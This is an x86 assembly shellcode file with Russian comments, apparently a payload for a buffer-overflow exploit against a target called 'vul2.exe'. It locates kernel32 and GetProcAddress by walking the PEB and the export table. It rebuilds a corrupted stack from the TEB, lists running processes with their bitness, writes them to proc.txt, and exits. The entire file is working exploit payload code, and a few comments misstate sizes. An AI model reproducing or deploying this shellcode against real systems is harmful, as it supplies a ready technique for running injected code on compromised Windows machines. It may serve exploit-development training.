[BITS 32]

start:
    xor eax, eax             
    mov eax, [fs:eax + 30h]  

;     typedef struct _PEB {
;   BYTE                          Reserved1[2]; 2 бйта
;   BYTE                          BeingDebugged; 1 байт
;   BYTE                          Reserved2[1]; 2 байта
;   PVOID                         Reserved3[2]; 8 байт  потому что указатель * 2
;   PPEB_LDR_DATA                 Ldr; цель
    mov eax, [eax + 0Ch]     
;     typedef struct _PEB_LDR_DATA {
;   BYTE       Reserved1[8];
;   PVOID      Reserved2[3];
;   LIST_ENTRY InMemoryOrderModuleList; цель
; } PEB_LDR_DATA, *PPEB_LDR_DATA;
    mov esi, [eax + 14h]    
    
    lodsd                    ; vul2.exe  Load String Doubleword, относится только к esi, данные кладет в eax
    xchg eax, esi           
    lodsd                   
; typedef struct _LDR_DATA_TABLE_ENTRY {
;     PVOID Reserved1[2];
;     LIST_ENTRY InMemoryOrderLinks;
;     PVOID Reserved2[2];
;     PVOID DllBase;                   цель 
;...
;}
    mov ebx, [eax + 10h]     


; typedef struct _IMAGE_DOS_HEADER {       DOS .EXE header
;     WORD   e_magic;                      Magic number (буквы "MZ")
;     WORD   e_cblp;                     
;      ...
;     LONG   e_lfanew;                    <- цель 0x3C (60 байт)
; } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

    mov edx, [ebx + 3Ch] 
    add edx, ebx         
    
;typedef struct _IMAGE_NT_HEADERS {
;     DWORD Signature;                            4 байта сигнатура "PE\0\0"
;     IMAGE_FILE_HEADER FileHeader;                20 байт 
;     IMAGE_OPTIONAL_HEADER32 OptionalHeader;     нужно в этом поле найти массив с данными директории
; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
; попадаем 


; typedef struct _IMAGE_OPTIONAL_HEADER {
;   WORD                 Magic;
;   BYTE                 MajorLinkerVersion;
;   BYTE                 MinorLinkerVersion;
; ....
;   IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <- 96 байт до этого поля, причем нулевой элемент массива это таблица экспорта, поэтому чтобы в нее попасть просто смещение 0x78
; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;


; typedef struct _IMAGE_DATA_DIRECTORY {
;   DWORD VirtualAddress; RVA адрес, хранит таблицу экспорта!!! именно нулевой индекс в массиве DataDirectory
;   DWORD Size;
; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

    mov edx, [edx + 78h] 
    add edx, ebx         
; typedef struct _IMAGE_EXPORT_DIRECTORY {
;     DWORD   Characteristics;       0x00
;     DWORD   TimeDateStamp;         0x04
;     WORD    MajorVersion;          0x08
;     WORD    MinorVersion;          0x0A
;     DWORD   Name;                  0x0C 
;     DWORD   Base;                  0x10
;     DWORD   NumberOfFunctions;     0x14 
;     DWORD   NumberOfNames;         0x18 
;     DWORD   AddressOfFunctions;    0x1C <- цель 3
;     DWORD   AddressOfNames;        0x20 <- цель 1
;     DWORD   AddressOfNameOrdinals; 0x24 <- цель 2
; } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

    mov esi, [edx + 20h] 
    add esi, ebx         ; ESI теперь указывает на начало массива УКАЗАТЕЛЕЙ!!!! на имена

    xor ecx, ecx         ;индекс       

find_function_loop:
    mov edi, [esi + ecx * 4]    ;указатель 4 байта
    add edi, ebx                 
    
    ; GetP (0x50746547)
    cmp dword [edi], 0x50746547
    jnz next_function           
    
    ; rocA (0x41636F72)
    cmp dword [edi + 4], 0x41636F72
    jnz next_function           
    
    ; ddre (0x65726464)
    cmp dword [edi + 8], 0x65726464
    jz find_function_finished    

next_function:
    inc ecx                      
    jmp find_function_loop       

find_function_finished:
;теперь ebx как база, содержащая абсолютный адрес кернела
    mov edx, [ebx + 3Ch]
    add edx, ebx
    mov edx, [edx + 78h]
    add edx, ebx
    
    mov edi, [edx + 24h] ;массив ординалов
    add edi, ebx           
    
    mov cx, [edi + ecx * 2] ; ординал 2 байта, достаем
    
    mov edi, [edx + 1Ch] ;заходим в массив адресов функций
    add edi, ebx          
    
    mov eax, [edi + ecx * 4] ;достаем RVA адрес функции по ее ординалу
    add eax, ebx             
    
    mov ebp, eax ;поскольку в стеке планируем вызвать новую функцию, то запомним ее адрес в ebp


    ; EBX = базовый адрес kernel32.dll
    ; EBP = адрес функции GetProcAddress
    
    ; Безопасно выделяем 12 КБ (0x3000) под наш буфер, 
    ; "трогая" каждую страницу, чтобы обойти ограничение Guard Page
    ; EBX = базовый адрес kernel32.dll
    ; EBP = адрес функции GetProcAddress

    ; --- СПАСЕНИЕ СТЕКА (Stack Teleport) ---
    ; Стек разрушен из-за переполнения. Читаем из TEB (Thread Environment Block)
    ; оригинальную вершину стека и переносим ESP в безопасную зону.
    mov eax, [fs:0x4]        ; Читаем Stack Base (самый старший, безопасный адрес)
    sub eax, 0x3000          ; Отступаем 16 КБ вниз (хватит для любых нужд)
    mov esp, eax             ; Телепортируем стек!
    mov esi, esp             ; ESI теперь указывает на начало нашего надежного буфера
    
    ; Карта памяти (относительно ESI):
    ; [esi]        = hSnapshot / hFile
    ; [esi + 4]    = pProcess32First / lpNumberOfBytesWritten
    
    ; Карта памяти (относительно ESI):
    ; [esi]        = hSnapshot
    ; [esi + 4]    = pProcess32First
    ; [esi + 8]    = pProcess32Next
    ; [esi + 12]   = pOpenProcess
    ; [esi + 16]   = pIsWow64Process
    ; [esi + 0x20] = Структура PROCESSENTRY32 (размер 0x128 байт)
    ; [esi + 0x160]= Буфер для формирования итоговой строки

    ; --- 1. Получаем адрес CreateToolhelp32Snapshot ---
    push 0x00000000          ; "\0\0\0\0"
    push 0x746f6873          ; "shot"
    push 0x70616e53          ; "Snap"
    push 0x3233706c          ; "lp32"
    push 0x65686c6f          ; "olhe"
    push 0x6f546574          ; "teTo"
    push 0x61657243          ; "Crea"
    push esp                 ; Указатель на строку
    push ebx                 ; hModule (kernel32)
    call ebp                 ; GetProcAddress(kernel32, "CreateToolhelp32Snapshot")
    add esp, 28              ; Очищаем стек от строки

    ; Вызываем CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS(2), 0)
    push 0
    push 2
    call eax                 
    mov dword [esi], eax     ; Сохраняем hSnapshot

    ; --- 2. Получаем адрес Process32First ---
    push 0x00007473          ; "st\0\0"
    push 0x72694632          ; "2Fir"
    push 0x33737365          ; "ess3"
    push 0x636f7250          ; "Proc"
    push esp
    push ebx
    call ebp
    add esp, 16
    mov dword [esi + 4], eax ; Сохраняем pProcess32First

    ; --- 3. Получаем адрес Process32Next ---
    push 0x00000074          ; "t\0\0\0"
    push 0x78654e32          ; "2Nex"
    push 0x33737365          ; "ess3"
    push 0x636f7250          ; "Proc"
    push esp
    push ebx
    call ebp
    add esp, 16
    mov dword [esi + 8], eax ; Сохраняем pProcess32Next

    ; --- 4. Получаем адрес OpenProcess ---
    push 0x00737365          ; "ess\0"
    push 0x636f7250          ; "Proc"
    push 0x6e65704f          ; "Open"
    push esp
    push ebx
    call ebp
    add esp, 12
    mov dword [esi + 12], eax ; Сохраняем pOpenProcess

    ; --- 5. Получаем адрес IsWow64Process ---
    push 0x00007373          ; "ss\0\0"
    push 0x65636f72          ; "roce"
    push 0x50343677          ; "w64P"
    push 0x6f577349          ; "IsWo"
    push esp
    push ebx
    call ebp
    add esp, 16
    mov dword [esi + 16], eax ; Сохраняем pIsWow64Process

    ; --- Настройка буфера и запуск обхода процессов ---
    mov dword [esi + 0x20], 0x128 ; Устанавливаем PROCESSENTRY32.dwSize = 296
    lea edi, [esi + 0x160]        ; EDI теперь указывает на начало итоговой строки
    mov byte [edi], 0             ; Инициализируем строку нулем

    ; Вызов Process32First(hSnapshot, &pe32)
    lea eax, [esi + 0x20]    ; Указатель на структуру pe32
    push eax
    mov eax, [esi]           ; hSnapshot
    push eax
    mov eax, [esi + 4]       ; pProcess32First
    call eax                 ; Вызов функции
    test eax, eax
    jz finish_process        ; Если процессов нет, переходим к выводу

process_loop:
    ; Копируем имя процесса: pe32.szExeFile (смещение 0x24 от начала pe32 -> esi + 0x44)
    lea ecx, [esi + 0x44]
copy_name:
    mov al, byte [ecx]
    test al, al
    jz check_bitness         ; Дошли до конца имени -> идем проверять разрядность
    mov byte [edi], al
    inc ecx
    inc edi
    jmp copy_name

check_bitness:
    ; Для проверки разрядности нужно открыть процесс
    ; OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION(0x1000), FALSE, pe32.th32ProcessID)
    mov eax, [esi + 0x28]    ; Достаем th32ProcessID (смещение 0x8 в pe32)
    push eax
    push 0
    push 0x1000
    mov eax, [esi + 12]      ; pOpenProcess
    call eax
    test eax, eax
    jz append_newline        ; Если Access Denied (системный процесс), просто пропускаем метку

    ; IsWow64Process(hProcess, &isWow64)
    sub esp, 4               ; Выделяем 4 байта под результат BOOL
    mov ecx, esp             ; ecx = &isWow64
    push ecx
    push eax                 ; hProcess
    mov eax, [esi + 16]      ; pIsWow64Process
    call eax
    
    pop eax                  ; Забираем результат &isWow64 со стека
    test eax, eax
    jnz process_x86          ; Если isWow64 == TRUE, значит процесс 32-битный (эмуляция на x64)

process_x64:
    ; Дописываем " [x64]"
    mov dword [edi], 0x36785b20   ; " [x6"
    mov dword [edi + 4], 0x00005d34 ; "4]\0\0"
    add edi, 6
    jmp append_newline

process_x86:
    ; Дописываем " [x86]"
    mov dword [edi], 0x38785b20   ; " [x8"
    mov dword [edi + 4], 0x00005d36 ; "6]\0\0"
    add edi, 6

append_newline:
    ; Дописываем перенос строки "\r\n"
    mov word [edi], 0x0A0D
    add edi, 2
    mov byte [edi], 0        ; Обязательно двигаем null-терминатор в конец строки

    ; Process32Next(hSnapshot, &pe32)
    lea eax, [esi + 0x20]
    push eax
    mov eax, [esi]
    push eax
    mov eax, [esi + 8]       ; pProcess32Next
    call eax
    test eax, eax
    jnz process_loop         ; Если есть еще процесс, идем на следующую итерацию
finish_process:
    ; --- 1. Находим CreateFileA ---
    ; "Crea" "teFi" "leA\0" (ровно 12 байт)
    push 0x0041656c          ; "leA\0"
    push 0x69466574          ; "teFi"
    push 0x61657243          ; "Crea"
    mov ecx, esp
    push ecx
    push ebx                 ; kernel32.dll
    call ebp                 ; GetProcAddress
    add esp, 12              ; Очищаем строку со стека
    mov [esi + 0x10], eax    ; Сохраняем pCreateFileA

    ; --- 2. Находим WriteFile ---
    ; "Writ" "eFil" "e\0\0\0" (ровно 12 байт)
    push 0x00000065          ; "e\0\0\0"
    push 0x6c694665          ; "eFil"
    push 0x74697257          ; "Writ"
    mov ecx, esp
    push ecx
    push ebx
    call ebp
    add esp, 12
    mov [esi + 0x14], eax    ; Сохраняем pWriteFile

    ; --- 3. Находим CloseHandle ---
    ; "Clos" "eHan" "dle\0" (ровно 12 байт)
    push 0x00656c64          ; "dle\0"
    push 0x6e614865          ; "eHan"
    push 0x736f6c43          ; "Clos"
    mov ecx, esp
    push ecx
    push ebx
    call ebp
    add esp, 12
    mov [esi + 0x18], eax    ; Сохраняем pCloseHandle

    ; --- 4. Создаем файл "proc.txt" ---
    ; "proc" ".txt" "\0\0\0\0" (ровно 12 байт)
    push 0x00000000          ; "\0\0\0\0"
    push 0x7478742e          ; ".txt"
    push 0x636f7270          ; "proc"
    mov ecx, esp             ; ecx -> "proc.txt"

    push 0                   ; hTemplateFile = NULL
    push 0x80                ; dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    push 2                   ; dwCreationDisposition = CREATE_ALWAYS
    push 0                   ; lpSecurityAttributes = NULL
    push 0                   ; dwShareMode = 0
    push 0x40000000          ; dwDesiredAccess = GENERIC_WRITE
    push ecx                 ; lpFileName = "proc.txt"
    mov eax, [esi + 0x10]
    call eax                 ; CreateFileA
    add esp, 12              ; Очищаем имя файла со стека
    mov [esi], eax           ; Сохраняем hFile

    ; --- 5. Записываем данные в файл ---
    lea ecx, [esi + 0x160]
    mov edx, edi
    sub edx, ecx             ; edx = длина строки в байтах

    push 0                   ; lpOverlapped = NULL
    lea eax, [esi + 0x4]     ; lpNumberOfBytesWritten
    push eax
    push edx                 ; nNumberOfBytesToWrite
    push ecx                 ; lpBuffer (наша строка с процессами)
    push dword [esi]         ; hFile
    mov eax, [esi + 0x14]
    call eax                 ; WriteFile

    ; --- 6. Закрываем файл ---
    push dword [esi]
    mov eax, [esi + 0x18]
    call eax                 ; CloseHandle

    ; --- 7. Чистый выход через ExitProcess ---
    ; "Exit" "Proc" "ess\0" (ровно 12 байт)
    push 0x00737365          ; "ess\0"
    push 0x636f7250          ; "Proc"
    push 0x74697845          ; "Exit"
    mov ecx, esp
    push ecx
    push ebx
    call ebp                 ; GetProcAddress
    
    push 0
    call eax                 ; ExitProcess(0)